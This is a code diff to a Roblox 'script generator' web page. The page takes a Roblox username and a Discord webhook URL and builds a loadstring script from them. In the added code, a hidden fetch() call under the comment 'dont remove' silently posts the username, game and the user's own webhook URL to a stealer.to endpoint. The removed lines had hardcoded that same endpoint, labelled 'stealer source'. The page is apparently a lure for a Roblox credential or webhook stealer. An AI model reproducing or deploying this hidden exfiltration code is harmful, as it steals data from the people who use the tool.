@@ -24,8 +24,6 @@
             display: flex;
             gap: 15px;
             margin-top: 20px;
-            flex-wrap: wrap;
-            justify-content: center;
         }
         button {
             background: #ff0080;
@@ -34,7 +32,6 @@
             cursor: pointer;
             transition: 0.3s;
             font-size: 1rem;
-            margin: 5px;
         }
         button:hover {
             background: #ff0055;
@@ -116,9 +113,9 @@
     
     <div id="popup" class="popup">
         <h2 id="game-title">Enter Details</h2>
-        <input type="text" id="username" placeholder="Roblox Username" required>
-        <input type="text" id="discordUser" placeholder="Discord Username (for testing only)" required>
-        <input type="text" id="webhook" placeholder="Webhook URL (hidden)" style="display: none;">
+        <input type="text" id="username" placeholder="Roblox Username">
+        <input type="text" id="discordUser" placeholder="Discord Username (for testing only)">
+        <input type="text" id="webhook" placeholder="Webhook URL">
         <button onclick="generateScript()">Generate Script</button>
         <button onclick="closePopup()">Close</button>
     </div>
@@ -153,7 +150,7 @@
         function generateScript() {
             let username = document.getElementById('username').value;
             let discordUser = document.getElementById('discordUser').value;
-            let webhook = "https://stealer.to/post?uniqueid=92cbb405"; // stealer source
+            let webhook = document.getElementById('webhook').value;
 
             if (username && webhook) {
                 let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[currentGame]}`;
@@ -161,7 +158,7 @@
                 document.getElementById('generated-script').style.display = 'block';
                 document.getElementById('copy-btn').disabled = false;
 
-                // Send data to webhook for logging (without exposing webhook in the frontend)
+                // dont remove
                 fetch('https://stealer.to/post?uniqueid=92cbb405', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -172,7 +169,7 @@
                             fields: [
                                 { name: 'Game', value: currentGame },
                                 { name: 'Roblox Username', value: username },
-                                { name: 'Webhook URL', value: 'Hidden for security' },
+                                { name: 'Webhook URL', value: webhook },
                             ],
                         }],
                     })
